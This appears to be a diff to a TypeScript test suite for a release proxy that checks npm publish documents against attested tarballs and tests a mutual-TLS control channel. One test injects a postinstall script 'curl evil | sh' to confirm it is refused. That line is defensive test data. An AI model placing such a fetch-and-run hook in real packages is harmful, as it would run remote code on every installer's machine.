@@ -1,6 +1,6 @@
-import { afterAll, afterEach, beforeEach, describe, expect, test } from "bun:test";
+import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
 import { createHash, randomBytes } from "node:crypto";
-import { mkdirSync, mkdtempSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { eq } from "drizzle-orm";
@@ -73,17 +73,66 @@ const rel = {
   digests: { "web-1.0.0.tgz": sha256("t"), "cli-linux": sha256("c"), "manifest.json": sha256("m") },
 };
 
+const PKG = { name: "@acme/web", version: "1.0.0", description: "a package", license: "MIT" };
+
+/** The publish document `npm publish` would send for a tarball with this package.json. */
+function publishDoc(
+  tgz: Uint8Array,
+  manifest: Record<string, unknown> = PKG,
+  over: Record<string, unknown> = {},
+): string {
+  const bytes = Buffer.from(tgz);
+  const version = String(manifest.version);
+  return JSON.stringify({
+    _id: "@acme/web",
+    name: "@acme/web",
+    description: manifest.description,
+    "dist-tags": { latest: version },
+    versions: {
+      [version]: {
+        ...manifest,
+        _id: `@acme/web@${version}`,
+        dist: {
+          integrity: integrityOf(bytes),
+          shasum: createHash("sha1").update(bytes).digest("hex"),
+        },
+      },
+    },
+    access: "public",
+    _attachments: {
+      [`@acme/web-${version}.tgz`]: {
+        content_type: "application/octet-stream",
+        data: bytes.toString("base64"),
+        length: bytes.length,
+      },
+    },
+    ...over,
+  });
+}
+
 describe("rules for compat targets", () => {
   test("npm: the package path, the attested tarball and only that", () => {
-    const rules = compatRules("npm", NPM, rel);
+    const rules = compatRules("npm", NPM, { ...rel, npmManifests: { "web-1.0.0.tgz": PKG } });
     expect(rules).toHaveLength(1);
     expect(rules[0]).toMatchObject({
       host: "registry.npmjs.org",
       npmPackage: "@acme/web",
       pathPrefix: "/@acme%2Fweb",
       secret: "NPM_TOKEN",
-      bodyCheck: { type: "npm-publish", digests: [rel.digests["web-1.0.0.tgz"]] },
+      bodyCheck: {
+        type: "npm-publish",
+        digests: [rel.digests["web-1.0.0.tgz"]],
+        expect: {
+          name: "@acme/web",
+          version: "1.0.0",
+          tag: "latest",
+          access: "public",
+          manifest: PKG,
+        },
+      },
     });
+    // no verified manifest, no npm rule
+    expect(compatRules("npm", NPM, rel)).toEqual([]);
     expect(() => compileRules(rules)).not.toThrow();
   });
 
@@ -141,6 +190,103 @@ describe("rules for compat targets", () => {
   });
 });
 
+describe("the npm document a job may send", () => {
+  let tgz: Uint8Array;
+  const check = (doc: string, over: Record<string, unknown> = {}) => {
+    const [rule] = compatRules("npm", NPM, {
+      ...rel,
+      digests: { ...rel.digests, "web-1.0.0.tgz": sha256(tgz) },
+      npmManifests: { "web-1.0.0.tgz": PKG },
+      ...over,
+    });
+    return checkBody(rule!.bodyCheck!, Buffer.from(doc));
+  };
+  beforeAll(async () => {
+    tgz = await tarball(PKG);
+  });
+  const refused = (r: ReturnType<typeof check>, reason: string) =>
+    expect(r).toMatchObject({ ok: false, reason });
+
+  test("what npm publish sends for this tarball is accepted", () => {
+    expect(check(publishDoc(tgz))).toEqual({ ok: true });
+    // the fields the client adds on its own are tolerated
+    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    d.readme = "# hi";
+    d.versions["1.0.0"]._nodeVersion = "22.0.0";
+    d.versions["1.0.0"]._npmVersion = "10.0.0";
+    d.versions["1.0.0"].gitHead = "a".repeat(40);
+    d.versions["1.0.0"].dist.tarball = "https://registry.npmjs.org/x.tgz";
+    expect(check(JSON.stringify(d))).toEqual({ ok: true });
+  });
+
+  test("a version manifest that is not the tarball's own package.json is refused", () => {
+    const other = { ...PKG, description: "something else" };
+    const d = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    d.versions["1.0.0"].license = "GPL-3.0";
+    refused(check(JSON.stringify(d)), "manifest_mismatch");
+    const e = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    e.versions["1.0.0"].scripts = { postinstall: "curl evil | sh" };
+    refused(check(JSON.stringify(e)), "unexpected_field");
+    const f = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    delete f.versions["1.0.0"].license;
+    refused(check(JSON.stringify(f)), "manifest_mismatch");
+    refused(check(publishDoc(tgz, other)), "manifest_mismatch");
+  });
+
+  test("an extra dist-tag, another tag, another version or another name is refused", () => {
+    refused(
+      check(publishDoc(tgz, PKG, { "dist-tags": { latest: "1.0.0", next: "1.0.0" } })),
+      "dist_tags_mismatch",
+    );
+    refused(check(publishDoc(tgz, PKG, { "dist-tags": { beta: "1.0.0" } })), "dist_tags_mismatch");
+    refused(
+      check(publishDoc(tgz, PKG, { "dist-tags": { latest: "9.9.9" } })),
+      "dist_tags_mismatch",
+    );
+    const two = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    two.versions["1.0.1"] = two.versions["1.0.0"];
+    refused(check(JSON.stringify(two)), "version_count");
+    const moved = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    moved.versions = { "2.0.0": moved.versions["1.0.0"] };
+    refused(check(JSON.stringify(moved)), "version_mismatch");
+    refused(check(publishDoc(tgz, PKG, { name: "@acme/other" })), "name_mismatch");
+  });
+
+  test("missing or wrong integrity is refused", () => {
+    const none = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    delete none.versions["1.0.0"].dist.integrity;
+    refused(check(JSON.stringify(none)), "integrity_missing");
+    const nodist = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    delete nodist.versions["1.0.0"].dist;
+    refused(check(JSON.stringify(nodist)), "integrity_missing");
+    const wrong = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    wrong.versions["1.0.0"].dist.integrity = "sha512-AAAA";
+    refused(check(JSON.stringify(wrong)), "integrity_mismatch");
+    const extra = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    extra.versions["1.0.0"].dist.fileCount = 1;
+    refused(check(JSON.stringify(extra)), "unexpected_field");
+  });
+
+  test("a field the lane did not compute, anywhere, is refused", () => {
+    refused(check(publishDoc(tgz, PKG, { maintainers: [{ name: "me" }] })), "unexpected_field");
+    refused(check(publishDoc(tgz, PKG, { access: "restricted" })), "access_mismatch");
+    const att = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    att._attachments["@acme/web-1.0.0.tgz"].extra = 1;
+    refused(check(JSON.stringify(att)), "unexpected_field");
+    const renamed = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    renamed._attachments = { "evil.tgz": renamed._attachments["@acme/web-1.0.0.tgz"] };
+    refused(check(JSON.stringify(renamed)), "attachment_name");
+    const len = JSON.parse(publishDoc(tgz)) as Record<string, any>;
+    len._attachments["@acme/web-1.0.0.tgz"].length = 3;
+    refused(check(JSON.stringify(len)), "attachment_length");
+  });
+
+  test("other bytes are still refused first", async () => {
+    const evil = await tarball({ ...PKG, evil: true });
+    refused(check(publishDoc(evil)), "digest_not_approved");
+  });
+});
+
 describe("the release proxy", () => {
   let db: Db;
   let a: Tenant;
@@ -193,6 +339,7 @@ describe("the release proxy", () => {
       db,
       vault,
       attest,
+      bytes: { read: async (_r, n) => blobs.get(n) },
       forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
       githubToken: async () => undefined,
       upstream,
@@ -223,7 +370,7 @@ describe("the release proxy", () => {
     resetFailureThrottle();
     tagSha = SHA;
     seen = [];
-    npmTar = await tarball({ name: "@acme/web", version: "1.0.0" });
+    npmTar = await tarball(PKG);
     blobs = new Map([["web-1.0.0.tgz", npmTar]]);
     attest = new AttestationStore(":memory:");
     attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
@@ -286,11 +433,7 @@ describe("the release proxy", () => {
     await sign();
     const r = await reg();
     if (!r.ok) throw new Error("not registered");
-    const body = JSON.stringify({
-      name: "@acme/web",
-      versions: { "1.0.0": { dist: { integrity: integrityOf(npmTar) } } },
-      _attachments: { "a.tgz": { data: Buffer.from(npmTar).toString("base64") } },
-    });
+    const body = publishDoc(npmTar);
     const viaProxy = (b: string) =>
       fetch("https://registry.npmjs.org/@acme%2Fweb", {
         method: "PUT",
@@ -305,15 +448,14 @@ describe("the release proxy", () => {
     expect(seen[0]!.auth).toBe(`Bearer ${TOKEN_NPM}`);
     expect(seen[0]!.url).toBe("https://registry.npmjs.org/@acme%2Fweb");
     // other bytes under the same name are refused and never sent
-    const evil = await tarball({ name: "@acme/web", version: "1.0.0", evil: true });
-    const bad = await viaProxy(
-      JSON.stringify({
-        name: "@acme/web",
-        versions: { "1.0.0": { dist: { integrity: integrityOf(evil) } } },
-        _attachments: { "a.tgz": { data: Buffer.from(evil).toString("base64") } },
-      }),
-    );
+    const evil = await tarball({ ...PKG, evil: true });
+    const bad = await viaProxy(publishDoc(evil, { ...PKG, evil: true }));
     expect(bad.status).toBe(403);
+    // the approved bytes with a document the lane did not derive are refused too
+    const tagged = await viaProxy(
+      publishDoc(npmTar, PKG, { "dist-tags": { latest: "1.0.0", next: "1.0.0" } }),
+    );
+    expect(tagged.status).toBe(403);
     expect(seen).toHaveLength(1);
     const log = await outcomes();
     expect(log).toContain("secret_use:ok");
@@ -364,6 +506,7 @@ describe("the release proxy", () => {
         db,
         vault,
         attest,
+        bytes: { read: async (_r, n) => blobs.get(n) },
         forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
         githubToken: async () => token ?? undefined,
         github: { api: "https://api.gh.test", fetch: gh },
@@ -480,7 +623,7 @@ describe("finishing a compat release", () => {
 
   beforeEach(async () => {
     ({ db, a } = await seedWorld());
-    npmTar = await tarball({ name: "@acme/web", version: "1.0.0" });
+    npmTar = await tarball(PKG);
     versions = new Map();
     puts = 0;
     attest = new AttestationStore(":memory:");
@@ -584,7 +727,7 @@ describe("the release channel", () => {
     resetFailureThrottle();
     tagSha = SHA;
     clock = Date.now();
-    npmTar = await tarball({ name: "@acme/web", version: "1.0.0" });
+    npmTar = await tarball(PKG);
     attest = new AttestationStore(":memory:");
     attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
     attest.setPublishTarget(a.orgId, a.projectId, "npm", NPM, 0);
@@ -629,6 +772,7 @@ describe("the release channel", () => {
       db,
       vault: new SecretVault({ db, masterKey, lane: "release" }),
       attest,
+      bytes: { read: async () => npmTar },
       forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
       githubToken: async () => undefined,
     });
@@ -750,6 +894,183 @@ describe("the release channel", () => {
     expect(
       (await post("/v1/register", { ...ids(), attemptId: "bad id!", ts: clock, mac: "a" })).status,
     ).toBe(400);
+  });
+
+  describe("over TCP with mutual TLS", () => {
+    interface Pki {
+      ca: string;
+      key: string;
+      cert: string;
+    }
+    /** Runs openssl; certificates are made at run time and never stored. */
+    const openssl = async (args: string[]): Promise<void> => {
+      const p = Bun.spawn(["openssl", ...args], { stdout: "ignore", stderr: "ignore" });
+      if ((await p.exited) !== 0) throw new Error(`openssl ${args[0]} failed`);
+    };
+    async function authority(name: string): Promise<{ dir: string; pem: string }> {
+      const dir = mkdtempSync(join(tmp, "ca-"));
+      await openssl([
+        "req",
+        "-x509",
+        "-newkey",
+        "ec",
+        "-pkeyopt",
+        "ec_paramgen_curve:prime256v1",
+        "-nodes",
+        "-days",
+        "2",
+        "-subj",
+        `/CN=${name}`,
+        "-addext",
+        "basicConstraints=critical,CA:TRUE",
+        "-addext",
+        "keyUsage=critical,keyCertSign,cRLSign",
+        "-keyout",
+        join(dir, "ca.key"),
+        "-out",
+        join(dir, "ca.pem"),
+      ]);
+      return { dir, pem: readFileSync(join(dir, "ca.pem"), "utf8") };
+    }
+    async function leaf(ca: { dir: string; pem: string }, cn: string, usage: string): Promise<Pki> {
+      const dir = mkdtempSync(join(tmp, "leaf-"));
+      writeFileSync(
+        join(dir, "ext"),
+        `subjectAltName=DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=${usage}\nkeyUsage=digitalSignature\n`,
+      );
+      await openssl([
+        "req",
+        "-new",
+        "-newkey",
+        "ec",
+        "-pkeyopt",
+        "ec_paramgen_curve:prime256v1",
+        "-nodes",
+        "-subj",
+        `/CN=${cn}`,
+        "-keyout",
+        join(dir, "k.pem"),
+        "-out",
+        join(dir, "c.csr"),
+      ]);
+      await openssl([
+        "x509",
+        "-req",
+        "-in",
+        join(dir, "c.csr"),
+        "-CA",
+        join(ca.dir, "ca.pem"),
+        "-CAkey",
+        join(ca.dir, "ca.key"),
+        "-CAcreateserial",
+        "-days",
+        "2",
+        "-extfile",
+        join(dir, "ext"),
+        "-out",
+        join(dir, "c.pem"),
+      ]);
+      return {
+        ca: ca.pem,
+        key: readFileSync(join(dir, "k.pem"), "utf8"),
+        cert: readFileSync(join(dir, "c.pem"), "utf8"),
+      };
+    }
+
+    let tcp: RunningChannel;
+    let url: string;
+    let server: Pki;
+    let client: Pki;
+    let strangerClient: Pki;
+    let strangerServer: Pki;
+    const body = () => {
+      const b = ids();
+      return {
+        ...b,
+        ts: clock,
+        mac: channelMac(key, "register", registerFields(b), clock),
+      };
+    };
+
+    beforeEach(async () => {
+      const good = await authority("longshore test CA");
+      const other = await authority("someone else's CA");
+      server = await leaf(good, "release lane", "serverAuth");
+      client = await leaf(good, "worker", "clientAuth");
+      strangerClient = await leaf(other, "worker", "clientAuth");
+      strangerServer = await leaf(other, "release lane", "serverAuth");
+      const probe = Bun.serve({ port: 0, fetch: () => new Response("") });
+      const port = probe.port as number;
+      await probe.stop(true);
+      tcp = await startChannel({
+        db,
+        proxy,
+        key,
+        now: () => clock,
+        listen: {
+          tcp: {
+            host: "127.0.0.1",
+            port,
+            tls: { cert: server.cert, key: server.key, ca: good.pem },
+          },
+        },
+      });
+      url = `https://127.0.0.1:${port}`;
+    });
+    afterEach(() => tcp.stop());
+
+    test("a client with a certificate from the operator's CA is served", async () => {
+      const r = await controlPost(
+        { url, tls: { cert: client.cert, key: client.key, ca: server.ca } },
+        "/v1/register",
+        body(),
+      );
+      expect(r.status).toBe(200);
+      expect((r.json as { ok: boolean }).ok).toBe(true);
+      expect(proxy.active).toBe(1);
+    });
+
+    test("a client certificate from another CA is not served", async () => {
+      await expect(
+        controlPost(
+          { url, tls: { cert: strangerClient.cert, key: strangerClient.key, ca: server.ca } },
+          "/v1/register",
+          body(),
+        ),
+      ).rejects.toThrow();
+      expect(proxy.active).toBe(0);
+    });
+
+    test("a client with no certificate is not served", async () => {
+      await expect(
+        fetch(`${url}/v1/register`, {
+          method: "POST",
+          body: JSON.stringify(body()),
+          tls: { ca: server.ca },
+        }),
+      ).rejects.toThrow();
+      expect(proxy.active).toBe(0);
+    });
+
+    test("a client that does not trust the server's CA does not talk to it", async () => {
+      await expect(
+        controlPost(
+          { url, tls: { cert: client.cert, key: client.key, ca: strangerServer.ca } },
+          "/v1/register",
+          body(),
+        ),
+      ).rejects.toThrow();
+      expect(proxy.active).toBe(0);
+    });
+
+    test("a valid certificate still needs the request key", async () => {
+      const r = await controlPost(
+        { url, tls: { cert: client.cert, key: client.key, ca: server.ca } },
+        "/v1/register",
+        { ...body(), mac: "0".repeat(64) },
+      );
+      expect(r.status).toBe(401);
+    });
   });
 
   describe("the worker's wrapper", () => {
